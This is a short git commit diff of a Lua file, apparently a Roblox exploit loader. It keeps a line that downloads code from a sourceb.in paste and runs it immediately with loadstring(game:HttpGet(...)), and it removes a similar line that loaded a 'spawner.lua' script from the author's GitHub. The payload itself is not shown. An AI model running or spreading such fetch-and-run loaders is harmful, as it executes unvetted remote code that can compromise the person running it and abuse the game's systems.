e4e187e75f7d52e08976bdc5bb8c6b77dadaaa24
skullsidk-prog <skullsidk@gmail.com>
2025-12-25 19:06:12 -0500

    Update s.lua

--- s.lua
+++ s.lua
@@ -1,3 +1,1 @@
 loadstring(game:HttpGet("https://cdn.sourceb.in/bins/qiL5bEXP2z/0", true))()
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/skullsidk-prog/adm/refs/heads/main/spawner.lua", true))()
